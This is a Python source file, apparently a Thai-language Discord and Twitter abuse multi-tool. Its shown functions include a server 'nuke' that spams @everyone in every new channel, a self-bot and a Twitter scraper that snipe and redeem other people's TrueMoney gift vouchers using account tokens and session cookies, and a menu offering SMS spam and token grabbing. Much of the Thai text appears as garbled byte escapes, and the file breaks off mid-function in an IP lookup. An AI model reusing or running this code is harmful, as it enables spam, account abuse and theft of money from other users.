xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93    """    
    embedspam = discord.Embed(content="@everyone", title="DISCORD NUKE", description=f"{kumtospam}", colour=randcolor)    
    embedspam1 = discord.Embed(content="@everyone", title="DISCORD NUKE", description=messpamnuke1, colour=randcolor)    
    @client.event        
    async def on_guild_channel_create(channel):        
        while True:            
            try:                
                await channel.send('@everyone xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93nxe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93nxe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93nxe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93nxe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93n', embed=embedspam)                
                await channel.send('@everyone xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93nxe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93nxe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93nxe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93nxe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93xe2x9bx93n', embed=embedspam1)                
                print(f'Spam Send!')            
            except:                
                print(('fail'))            
            def thread():                    
                threading.Thread(target=on_guild_channel_create, args=(TOKEN)).start()    
    client.run(TOKEN)
def truemoney():    
    from discord.ext import commands    
    import re    
    import requests    
    from httpx import Client, post    
    from re import search    
    from random import shuffle    
    from ssl import create_default_context,SSLContext    
    phonenum = input("Phone : ")    
    webhook = input("Webhook : ")    
    token = input("Token : ")    # 
    #bp    
    class SSLFactory:        
        def __init__(self):            
            self.ciphers = "ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES".split(":")        
        def __call__(self) -> SSLContext:            
            shuffle(self.ciphers)            
            context = create_default_context()            
            context.set_ciphers(f"{':'.join(self.ciphers)}:!aNULL:!eNULL:!MD5")            
            return context    
    sess = Client(verify=SSLFactory()(),headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67"})    
    def redeem(phonenum, voucher):        
        code = voucher.replace("https://gift.truemoney.com/campaign/?v=", "")                
        d=sess.post(f"https://gift.truemoney.com/campaign/vouchers/{code}/redeem",json={"mobile":phonenum,"voucher_hash":code})        
        if d.status_code == 200:            
            d=d.json()            
            try:                
                post(webhook,json={"content": "GOD","embeds": [{"title": f"CNP MOBILE | SUCCESS","description":f"```pynnxe0xb8x8axe0xb8xb7xe0xb9x88xe0xb8xadxe0xb8x84xe0xb8x99xe0xb8xaaxe0xb8xa3xe0xb9x89xe0xb8xb2xe0xb8x87xe0xb8x8bxe0xb8xadxe0xb8x87 : {d['data']['owner_profile']['full_name']}nxe0xb9x84xe0xb8x94xe0xb9x89xe0xb8xa3xe0xb8xb1xe0xb8x9axe0xb9x80xe0xb8x87xe0xb8xb4xe0xb8x99xe0xb8xa1xe0xb8xb2xe0xb8x97xe0xb8xb1xe0xb9x89xe0xb8x87xe0xb8xabxe0xb8xa1xe0xb8x94 : {d['data']['voucher']['redeemed_amount_baht']}nxe0xb8x8bxe0xb8xadxe0xb8x87xe0xb8xa3xe0xb8xb2xe0xb8x84xe0xb8xb2 : {d['data']['voucher']['amount_baht']} xe0xb8x9axe0xb8xb2xe0xb8x97nxe0xb8xa3xe0xb8xb1xe0xb8x9axe0xb9x84xe0xb8x9bxe0xb8x97xe0xb8xb1xe0xb9x89xe0xb8x87xe0xb8xabxe0xb8xa1xe0xb8x94 : {d['data']['voucher']['redeemed']} xe0xb8x84xe0xb8x99nxe0xb9x80xe0xb8xabxe0xb8xa5xe0xb8xb7xe0xb8xadxe0xb9x83xe0xb8xabxe0xb9x89xe0xb8xa3xe0xb8xb1xe0xb8x9axe0xb8xadxe0xb8xb5xe0xb8x81 {d['data']['voucher']['available']} xe0xb8x84xe0xb8x99n```nlink : https://gift.truemoney.com/campaign/?v={d['data']['voucher']['link']}n```pynxe0xb8xa3xe0xb8xb1xe0xb8x9axe0xb8x8bxe0xb8xadxe0xb8x87xe0xb8x94xe0xb9x89xe0xb8xa7xe0xb8xa2xe0xb9x82xe0xb8x97xe0xb9x80xe0xb8x84xe0xb9x88xe0xb8x99 : {token[:27]}#######################n```","thumbnail":{ "url":"https://cdn.discordapp.com/attachments/952778386764345364/961104958000877578/5578389.png" },"color": 2752256}]})            
            except:pass            
            print(f"{Fore.GREEN}[+] SUCCSS : {code}{Fore.RESET}")        
        else:            
            d=d.json()            
            messagx = ""            
            if d['status']['code'] != "VOUCHER_NOT_FOUND":                
                messagx+=f"```pynxe0xb8x8bxe0xb8xadxe0xb8x87xe0xb8x9cxe0xb8xb4xe0xb8x94xe0xb8x9exe0xb8xa5xe0xb8xb2xe0xb8x94!nlink : https://gift.truemoney.com/campaign/?v={d['data']['voucher']['link']}n```"            
                try:                 
                    post(webhook,json={"content": None,"embeds": [{"title": f"{d['status']['message']}","description":f"```pynxe0xb8x8bxe0xb8xadxe0xb8x87xe0xb8x9cxe0xb8xb4xe0xb8x94xe0xb8x9exe0xb8xa5xe0xb8xb2xe0xb8x94 xf0x9fxa7xa7xe2x9dx8cn```","thumbnail":{ "url":"https://cdn.discordapp.com/attachments/952778386764345364/961104958000877578/5578389.png" },"color": 16711680}]})            
                except:pass            
            print(f"{Fore.RED}[!] Error : {d['status']['message']}{Fore.RESET}")    
    client = commands.Bot(command_prefix = "!")    
    client.remove_command('help')    
    @client.event    
    async def on_message(message):        
        if "https://gift.truemoney.com/campaign/?v=" in message.content:            
            code = re.search("(?P<url>https?://[^s]+)", message.content).group("url")            
            redeem(phonenum, code)    
    @client.event    
    async def on_ready():        
        os.system('cls' if os.name == 'nt' else 'clear')        
        print(f"Login as : {client.user}")    
    client.run(token, bot=False)
def tw():    
    import gratient    
    from httpx import Client, post    
    from re import search    
    from random import shuffle    
    from ssl import create_default_context,SSLContext    
    from json import load    
    from threading import Thread    
    print()    
    ct0 = input(f"{Fore.LIGHTCYAN_EX}Ct0 : {Fore.RESET}")    
    auth = input(f"{Fore.LIGHTWHITE_EX}Auth_token : {Fore.RESET}")    
    webhook = input(f"{Fore.LIGHTWHITE_EX}Webhook : {Fore.RESET}")    
    phonenumber = input(f"{Fore.LIGHTWHITE_EX}phone : {Fore.RESET}")    
    print(Fore.GREEN + ("[ Twitter ] Ready To Sniper "))        # 
    #bp    
    class SSLFactory:        
        def __init__(self):            
            self.ciphers = "ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES".split(":")        
        def __call__(self) -> SSLContext:            
            shuffle(self.ciphers)            
            context = create_default_context()            
            context.set_ciphers(f"{':'.join(self.ciphers)}:!aNULL:!eNULL:!MD5")            
            return context    
    redeemed=set()    
    sess = Client(verify=SSLFactory()(),headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67"})        
    headers={    "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",    "x-csrf-token": ct0,    "cookie": f"auth_token={auth}; ct0={ct0}; lang=en",    "x-twitter-active-user": "yes",    "x-twitter-auth-type": "OAuth2Session",    "x-twitter-client-language": "en",    "user-agent": "Mozilla/5.0"    }    
    def redeem(v:str):        
        try:            
            while 1:                
                resp=sess.post(f"https://gift.truemoney.com/campaign/vouchers/{v}/redeem",json={"mobile":phonenumber,"voucher_hash":v}).json()                
                get_money = {resp['data']['voucher']['redeemed_amount_baht']}                
                infolink = {resp['data']['voucher']['amount_baht']}                                
                if resp["status"]["code"] == "RESERVED_TICKET": continue                
                if resp["status"]["code"] == "SUCCESS":                    
                    post(webhook,json={"content": "@everyone","embeds": [{"title": f"CNPFLOOD MOBILE | SUCCESS","description":f"```pyn[+] Redeem : {v}nGET : {resp['data']['voucher']['redeemed_amount_baht']}/{resp['data']['voucher']['amount_baht']}n```","thumbnail":{ "url":"https://cdn.discordapp.com/attachments/952778386764345364/961094687823912970/kPkgtX3mvBd7AAAAAASUVORK5CYII.png" },"color": 2752256}]})                    
                    print(f"{Fore.GREEN}[+] Redeem : {v} : GET : {get_money}/{infolink}{Fore.RESET}")        
        except Exception as e:print(f"{Fore.RED}[!] got rate limit truemoney wellet : {e}{Fore.RESET}")    
    if __name__ == "__main__":        
        while 1:            
            try:                
                resp=sess.get("https://twitter.com/i/api/2/search/adaptive.json?include_profile_interstitial_type=1&include_blocking=1&include_blocked_by=1&include_followed_by=1&include_want_retweets=1&include_mute_edge=1&include_can_dm=1&include_can_media_tag=1&include_ext_has_nft_avatar=1&skip_status=1&cards_platform=Web-12&include_cards=1&include_ext_alt_text=true&include_quote_count=true&include_reply_count=20&tweet_mode=extended&include_entities=true&include_user_entities=true&include_ext_media_color=true&include_ext_media_availability=true&include_ext_sensitive_media_warning=true&include_ext_trusted_friends_metadata=true&send_error_codes=true&simple_quoted_tweet=true&q=gift.truemoney.com&tweet_search_mode=live&count=1&query_source=typed_query&pc=1&spelling_corrections=1&ext=mediaStats%2ChighlightedLabel%2ChasNftAvatar%2CvoiceInfo%2Cenrichments%2CsuperFollowMetadata",headers=headers).json()                
                for tweet in resp["globalObjects"].get("tweets",[]):                    
                    try:                        
                        v = search(r"(?<=?v=)[A-z0-9]+",resp["globalObjects"]["tweets"][tweet]["entities"]["urls"][0]["expanded_url"]).group(0)                        
                        if v not in redeemed:                            
                            for i in range(10):                                
                                Thread(target=redeem,args=(v,)).start()                    
                    except:pass            
            except Exception as e:                
                post(webhook,json={"content": None,"embeds": [{"title": f"CNPFLOOD | ERROR","description":f"```pynCt0 Error xe0xb9x82xe0xb8x9bxe0xb8xa3xe0xb8x94xe0xb8x95xe0xb8xb4xe0xb8x94xe0xb8x95xe0xb9x88xe0xb8xadxe0xb8x84xe0xb8x99xe0xb8xabxe0xb8xa5xe0xb9x88xe0xb8xadxe0xb9x81xe0xb8xa5xe0xb9x89xe0xb8xa7xe0xb8xa3xe0xb8xadn```","thumbnail":{ "url":"https://cdn.discordapp.com/attachments/952778386764345364/961094687823912970/kPkgtX3mvBd7AAAAAASUVORK5CYII.png" },"color": 16711680}]})                
                print(f"{Fore.RED}[!] ct0 error : ({e}){Fore.RESET}")
def openbotmoney():    
    import discord    
    from discord.ext import commands    
    from random import shuffle    
    from ssl import SSLContext, create_default_context    
    import requests    
    from json import loads    
    import gratient    
    import json    
    from httpx import Client, post    
    bot = commands.Bot(command_prefix="!")    
    phone = input(f"{Fore.GREEN}xe0xb9x80xe0xb8x9axe0xb8xadxe0xb8xa3xe0xb9x8c : {Fore.RESET}")    
    money = input(f"{Fore.GREEN}xe0xb8xa3xe0xb8xb2xe0xb8x84xe0xb8xb2xe0xb8xaaxe0xb8xb4xe0xb8x99xe0xb8x84xe0xb9x89xe0xb8xb2 : {Fore.RESET}")    
    token = input(f"{Fore.GREEN}xe0xb9x82xe0xb8x97xe0xb9x80xe0xb8x84xe0xb9x88xe0xb8x99 xe0xb8x9axe0xb8xadxe0xb8x97 : {Fore.RESET}")    
    givenrole = input(f"{Fore.GREEN}xe0xb8x8axe0xb8xb7xe0xb9x88xe0xb8xadxe0xb8xa2xe0xb8xa8xe0xb8x97xe0xb8xb5xe0xb9x88xe0xb8x88xe0xb8xb0xe0xb9x83xe0xb8xabxe0xb9x89 : {Fore.RESET}")    
    class SSLFactory:        
        def __init__(self):            
            self.ciphers = "ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES".split(":")        
        def __call__(self) -> SSLContext:            
            shuffle(self.ciphers)            
            context = create_default_context()            
            context.set_ciphers(f"{':'.join(self.ciphers)}:!aNULL:!eNULL:!MD5")            
            return context    
    @bot.event    
    async def on_ready():        
        print(f"login as {bot.user}")    
    @bot.command()    
    async def buy(ctx,*,link):        
        sess = Client(verify=SSLFactory()(),headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67"})        
        try:            
            truewallet_gift_voucher_code = (link.split("https://gift.truemoney.com/campaign/?v=",1)[1])            
            d=sess.post(f"https://gift.truemoney.com/campaign/vouchers/{truewallet_gift_voucher_code}/redeem",json={"mobile":phone,"voucher_hash":truewallet_gift_voucher_code})            
            if d.status_code == 200:                
                embed = discord.Embed(title="xe0xb8xa3xe0xb8xb2xe0xb8xa2xe0xb8x81xe0xb8xb2xe0xb8xa3 xe0xb9x80xe0xb8x95xe0xb8xb4xe0xb8xa1xe0xb9x80xe0xb8x87xe0xb8xb4xe0xb8x99xe2x9cx85", description=f"""        xe0xb8x97xe0xb8xb3xe0xb8xa3xe0xb8xb2xe0xb8xa2xe0xb8x81xe0xb8xb2xe0xb8xa3xe0xb8xaaxe0xb8xb3xe0xb9x80xe0xb8xa3xe0xb9x87xe0xb8x88xe2x9cx85        xe0xb8x88xe0xb8xb3xe0xb8x99xe0xb8xa7xe0xb8x99xe0xb9x80xe0xb8x87xe0xb8xb4xe0xb8x99xe0xb8x97xe0xb8xb5xe0xb9x88xe0xb9x84xe0xb8x94xe0xb9x89xe0xb8xa3xe0xb8xb1xe0xb8x9a : {(d['data']['voucher']['amount_baht'])} xe0xb8x9axe0xb8xb2xe0xb8x97        xe0xb8x8axe0xb8xb7xe0xb9x88xe0xb8xadxe0xb8x84xe0xb8x99xe0xb8xaaxe0xb8xa3xe0xb9x89xe0xb8xb2xe0xb8x87xe0xb8x8bxe0xb8xadxe0xb8x87 : {(d['data']['owner_profile']['full_name'])} | {ctx.author.mention}            """, footer="CNP HUB", colour=0x52FF00)                
                embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.avatar_url)                
                await ctx.send(embed=embed)            
            elif d.status_code != 200:                    
                embed = discord.Embed(title="xe0xb8x81xe0xb8xb3xe0xb8xa5xe0xb8xb1xe0xb8x87xe0xb8x97xe0xb8xb3xe0xb8xa3xe0xb8xb2xe0xb8xa2xe0xb8x81xe0xb8xb2xe0xb8xa3 xe0xb9x80xe0xb8x95xe0xb8xb4xe0xb8xa1xe0xb9x80xe0xb8x87xe0xb8xb4xe0xb8x99xe2x9cx85", description=f"""                xe0xb8xa5xe0xb8xb4xe0xb9x89xe0xb8x87xe0xb8x99xe0xb8xb5xe0xb9x89xe0xb9x84xe0xb8xa1xe0xb9x88xe0xb8xaaxe0xb8xb2xe0xb8xa1xe0xb8xb2xe0xb8xa3xe0xb8x96xe0xb9x83xe0xb8x8axe0xb9x89xe0xb8x87xe0xb8xb2xe0xb8x99xe0xb9x84xe0xb8x94xe0xb9x89                    """, footer="BUYSMS", colour=0xffa6bb)                    
                embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.avatar_url)                    
                await ctx.send(embed=embed)            
            else:                
                embed = discord.Embed(title="xe0xb8xa3xe0xb8xb2xe0xb8xa2xe0xb8x81xe0xb8xb2xe0xb8xa3 xe0xb9x80xe0xb8x95xe0xb8xb4xe0xb8xa1xe0xb9x80xe0xb8x87xe0xb8xb4xe0xb8x99xe2x9cx85", description=f"""                xe0xb8x97xe0xb8xb3xe0xb8xa3xe0xb8xb2xe0xb8xa2xe0xb8x81xe0xb8xb2xe0xb8xa3xe0xb9x84xe0xb8xa1xe0xb9x88xe0xb8xaaxe0xb8xb3xe0xb9x80xe0xb8xa3xe0xb9x87xe0xb8x88xe2x9dx8c                    """, footer="CNP HUB", colour=0x52FF00)                
                embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.avatar_url)                
                await ctx.send(embed=embed)            
            truewallet_gift_amount = (d['data']['voucher']['amount_baht'])            
            if truewallet_gift_amount == money:                
                embed = discord.Embed(title="xe0xb8xa3xe0xb8xb2xe0xb8xa2xe0xb8x81xe0xb8xb2xe0xb8xa3 xe0xb9x80xe0xb8x95xe0xb8xb4xe0xb8xa1xe0xb9x80xe0xb8x87xe0xb8xb4xe0xb8x99xe2x9cx85", description=f"""                xe0xb9x84xe0xb8x94xe0xb9x89xe0xb8xa3xe0xb8xb1xe0xb8x9axe0xb8xa2xe0xb8xa8 {givenrole}                """, footer="BUYSMS", colour=0xffa6bb)                
                embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.avatar_url)                
                role = discord.utils.get(ctx.guild.roles, name=givenrole)                
                await ctx.edit(embed=embed)                
                await ctx.author.add_roles(role)        
        except:            
            embed = discord.Embed(title="xe0xb8xa3xe0xb8xb2xe0xb8xa2xe0xb8x81xe0xb8xb2xe0xb8xa3 xe0xb9x80xe0xb8x95xe0xb8xb4xe0xb8xa1xe0xb9x80xe0xb8x87xe0xb8xb4xe0xb8x99xe2x9cx85", description=f"""            xe0xb8x97xe0xb8xb3xe0xb8xa3xe0xb8xb2xe0xb8xa2xe0xb8x81xe0xb8xb2xe0xb8xa3xe0xb9x84xe0xb8xa1xe0xb9x88xe0xb8xaaxe0xb8xb3xe0xb9x80xe0xb8xa3xe0xb9x87xe0xb8x88xe2x9dx8c                """, footer="CNP HUB", colour=0x52FF00)            
            embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.avatar_url)            
            await ctx.send(embed=embed)            
            bot.run(token)
def page2():    
    print(Fore.GREEN + """       xe2x95x94xe2x95x90xe2x95x97xe2x95x94xe2x95x97xe2x95x94xe2x95x94xe2x95x90xe2x95x97  xe2x95x94xe2x95x90xe2x95x97xe2x95x94xe2x95x90xe2x95x97xe2x95x94xe2x95xa6xe2x95x97xe2x95x94xe2x95xa6xe2x95x97xe2x95xa6 xe2x95xa6xe2x95x94xe2x95x97xe2x95x94xe2x95xa6xe2x95x94xe2x95xa6xe2x95x97xe2x95xa6 xe2x95xa6     xe2x95x91  xe2x95x91xe2x95x91xe2x95x91xe2x95xa0xe2x95x90xe2x95x9d  xe2x95x91  xe2x95x91 xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91 xe2x95x91xe2x95x91xe2x95x91xe2x95x91xe2x95x91 xe2x95x91 xe2x95x9axe2x95xa6xe2x95x9d     xe2x95x9axe2x95x90xe2x95x9dxe2x95x9dxe2x95x9axe2x95x9dxe2x95xa9    xe2x95x9axe2x95x90xe2x95x9dxe2x95x9axe2x95x90xe2x95x9dxe2x95xa9 xe2x95xa9xe2x95xa9 xe2x95xa9xe2x95x9axe2x95x90xe2x95x9dxe2x95x9dxe2x95x9axe2x95x9dxe2x95xa9 xe2x95xa9  xe2x95xa9         (    BY : Chanaphon#9999     )    xe2x95x94xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x97    xe2x95x91                                     xe2x95x91    xe2x95x91    <       8.xe0xb8x9axe0xb8xadxe0xb8x97xe0xb8xa3xe0xb9x89xe0xb8xb2xe0xb8x99xe0xb8x84xe0xb9x89xe0xb8xb2         >     xe2x95x91    xe2x95x91                                     xe2x95x91    xe2x95x91           [ Page 2/2 > ]            xe2x95x91    xe2x95x9axe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x90xe2x95x9d    """)    
    option1 = input(f"{Fore.WHITE}xe0xb8x81xe0xb8xa3xe0xb8xb8xe0xb8x93xe0xb8xb2xe0xb9x80xe0xb8xa5xe0xb8xb7xe0xb8xadxe0xb8x81xe0xb9x82xe0xb8xabxe0xb8xa1xe0xb8x94 [>] {Fore.RESET}")    
    if option1 == "8":        
        os.system('cls' if os.name == 'nt' else 'clear')        
        openbotmoney()        
def main():    
    print(Fore.GREEN + """
            ░█▀█░█░█░█▀█░░░█▄█░█▀█░█▀▄░▀█▀░█░░░█▀▀░░
            ░█▀▀░░█░░█▀▀░░░█░█░█░█░█▀▄░░█░░█░░░█▀▀░░
            ░▀░░░░▀░░▀░░░░░▀░▀░▀▀▀░▀▀░░▀▀▀░▀▀▀░▀▀▀░░
                        (By Gsafad#1287) 
                        1.spam sm 
                        2.tw sniper
                        3.webhook tool
                        4.get token
                        5.discord copy
                        6.discord spam
                        7.true money sniper""")    
    option = input(f"{Fore.WHITE}กรุณาเลือกโหมด [>]  {Fore.RESET}")    
    if option == "1":        
            os.system('cls' if os.name == 'nt' else 'clear')        
            smsspamnew()    
    if option == "2":        
            os.system('cls' if os.name == 'nt' else 'clear')        
            tw()    
    if option == "3":        
            os.system('cls' if os.name == 'nt' else 'clear')        
            webhooktool()    
    if option == "4":        
            os.system('cls' if os.name == 'nt' else 'clear')        
            gettoken()    
    if option == "5":        
            os.system('cls' if os.name == 'nt' else 'clear')        
            copydiscord()    
    if option == "6":        
            os.system('cls' if os.name == 'nt' else 'clear')        
            newn()    
    if option == "7":        
            os.system('cls' if os.name == 'nt' else 'clear')        
            truemoney()    
    if option == ">":        
            os.system('cls' if os.name == 'nt' else 'clear')        
            page2()    
    else:        
            print("xe0xb8x9bxe0xb8xb1xe0xb8x8dxe0xb8x8dxe0xb8xb2xe0xb8xadxe0xb9x88xe0xb8xadxe0xb8x99 xe0xb9x80xe0xb8xa5xe0xb8xb7xe0xb8xadxe0xb8x81xe0xb8x97xe0xb8xb3xe0xb9x80xe0xb8xabxe0xb8xb5xe0xb9x89xe0xb8xa2xe0xb9x84xe0xb8xa3")# 
##


import socket
def get_private_ip():   
            ip = socket.gethostbyname(socket.gethostname())    
            return ip
            ip = get_private_ip() 
def getip():
            ip = "None"
            try:
                url = 'http://ipinfo.io/json'
